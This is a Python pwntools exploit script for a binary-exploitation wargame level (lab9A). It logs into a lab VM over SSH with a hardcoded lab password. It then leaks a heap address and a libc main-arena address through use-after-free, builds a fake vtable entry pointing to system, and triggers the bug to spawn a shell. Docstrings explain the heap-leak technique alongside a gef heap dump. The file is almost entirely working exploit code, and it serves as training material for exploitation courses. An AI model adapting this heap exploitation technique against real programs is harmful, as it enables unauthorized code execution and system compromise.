# GOT IT

import sys
import time
import struct
import pprint

from pwn import *

def main():

  session = ssh(host="192.168.159.129", user="lab9A", password="1_th0uGht_th4t_w4rn1ng_wa5_l4m3")
  sh = session.process("/bin/sh", env={"PS1":""})
  sendget(sh, "/levels/lab09/lab9A")

#  heap_ptr = heap_leak(sh)
#  log.info("Successfully leaked a heap address: 0x%x" % (heap_ptr))

  libc_ptr = libc_leak(sh)
  log.info("Successfully leaked main arena: 0x%x" % (libc_ptr))

  exploit(sh, libc_ptr)

  sh.interactive()

def exploit(sh, libc_ptr):

  system = libc_ptr - 0x16a2c0
  binsh = libc_ptr - 0x49a2c 

  log.info("Allocating first chunk at index 4, in-mem-size: 0x18")
  do_new_set(sh, 4, 4)

  log.info("Creating evil vtable entry ;)")
  do_add_item(sh, 4, system+1) # needed or will not be written

  log.info("Allocating second chunk at index 3")
  do_new_set(sh, 3, 9)
  for i in range(9):
    do_add_item(sh, 3, (0x61616161+i))

  log.info("Freeing heap allocation at index 3")
  do_del_set(sh, 3)

  log.info("Freeing heap allocation at index 4")
  do_del_set(sh, 4)

#  print("\ngdb -q -p $(pidof lab9A)")
#  print("b * 0x08049338")
#  print("c\n")

  input("[*] Trigger?: ")

  log.info("Triggering UAF, calling evil vtable")
  print( do_find_item(sh, 4, binsh) )

  sh.sendline("id")
  print(sh.readline())

def heap_leak(sh):
  '''
  So how does this work? First we allocate 2 objects each at seperate indexes 0 and 1. Then we
  free(0). If you were to observe the allocated chunks after this operation you'd see that the
  first index - 0 now has a heap address at offset 0 vs the expected 0x08049aa8 in <chunk 2>.
  This address is just before <chunk 3>.

  Next we free(1), this causes both <chunk 2> and <chunk3> within index 1 to contain pointers
  into the heap. Of course we need <chunk 3>+0x00 to point to 0x08049aa8 otherwise we cannot
  call do_find_item() without a crash. So we finally call do_new_set with an equal size as the
  last allocation at this index. Allowing us to re-allocate <chunk 2> at the modified location
  as a result <chunk 2>+0xc points to <chunk 3> which recall at offset 0 now contains a heap
  address.

  Allowing us to leak a heap pointer.
  '''

  do_new_set(sh, 0, 4)
  do_new_set(sh, 1, 4)
  do_del_set(sh, 0)
  do_del_set(sh, 1)
  do_new_set(sh, 1, 4)

  leak = do_find_item(sh, 1, 0).split(b'=')[1].split(b'\n')[0].strip()

  return int(leak)

def libc_leak(sh):
  '''
  Unlike the last leak allocate 3 objects, however this time at index 1 we make a larger
  allocation. Why? Recall that the "heap leak" caused <chunk 2> and <chunk 3> to contain some
  addresses to the heap, where in the heap? Let's see (assuming the leak has been done):

  gef➤  heap chunks
  Chunk(addr=0x9b43008, size=0x28, flags=PREV_INUSE)
    [0x09b43008     30 30 b4 09 60 30 b4 09 00 00 00 00 00 00 00 00    00..`0..........]
  Chunk(addr=0x9b43030, size=0x18, flags=PREV_INUSE)
    [0x09b43030     40 30 b4 09 04 00 00 00 00 00 00 00 48 30 b4 09    @0..........H0..]
  Chunk(addr=0x9b43048, size=0x18, flags=PREV_INUSE)
    [0x09b43048     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
  Chunk(addr=0x9b43060, size=0x18, flags=PREV_INUSE)
    [0x09b43060     a8 9a 04 08 04 00 00 00 00 00 00 00 78 30 b4 09    ............x0..]
  Chunk(addr=0x9b43078, size=0x18, flags=PREV_INUSE)
    [0x09b43078     28 30 b4 09 00 00 00 00 00 00 00 00 00 00 00 00    (0..............]
  Chunk(addr=0x9b43090, size=0x20f78, flags=PREV_INUSE)  ←  top chunk

  In the above 0x9b43030 would be index 0 <chunk 3>, where <chunk 3> is 0x9b43048. Based on this
  index 1 would be 0x9b43060. If you look at <chunk 3> in offset 1 you can see the heap address,
  0x9b43028 this would be the heap address leaked when calling do_find_item().

  This address sits below index 0. What would happen if we allocated 8 items vs 4? We would get
  another address this time just below <chunk 3> at index 0. If we send a large enough allocation
  we end up leaking the main arena - where our allocation requests come from. Unlike the thread
  arena, main arena is a global variable and hence can be found in libc.

  We can use this to offset to system ;)

  So why the third allocation? We do this to prevent the heap from from forming a bigger chunk.
  Should we not allocate a third chunk the leak is ruined.
  '''
  do_new_set(sh, 0, 8)
  do_new_set(sh, 1, 66)
  do_new_set(sh, 2, 1337)

  do_del_set(sh, 0)
  do_del_set(sh, 1)
  
  do_new_set(sh, 1, 66)

  leak = do_find_item(sh, 1, 0).split(b'=')[1].split(b'\n')[0].strip()

  return ( int(leak) + 0x100000000 )

def do_new_set(sh, lockbox, items):

  sendget(sh, '1')
  sendget(sh, '%d' % (lockbox))
  retVal = sendget(sh, "%d" % (items), True)

  return retVal

def do_add_item(sh, lockbox, item):

  sendget(sh, '2')
  sendget(sh, '%d' % (lockbox))
  retVal = sendget(sh, "%d" % (item), True)

  return retVal

def do_find_item(sh, lockbox, item):

  sendget(sh, '3')
  sendget(sh, '%d' % (lockbox))
  retVal = sendget(sh, "%d" % (item), True)

  return retVal

def do_del_set(sh, lockbox):

  sendget(sh, '4')
  retVal = sendget(sh, '%d' % (lockbox), True)

  return retVal

# sendget: send bytes and retrieve bytes (less code if in function)
def sendget(sh, message, print_output=False):

  sh.sendline(message)
  if print_output == False:
    sh.read()
  else:
    return sh.read()

  return

main()
